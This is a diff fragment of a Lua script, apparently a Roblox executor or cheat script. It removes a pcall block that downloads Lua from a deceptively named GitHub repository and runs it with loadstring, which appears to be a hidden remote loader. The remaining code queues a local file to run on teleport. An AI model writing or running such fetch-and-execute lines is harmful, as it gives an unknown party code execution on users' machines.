@@ -87,10 +87,6 @@ if game.PlaceId == HUB_PLACE then
         task.wait()
     until HyphonScript
 
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/asdwasd.lua"))()
-    end)
-
     qt = get_queue()
     if qt then
         qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
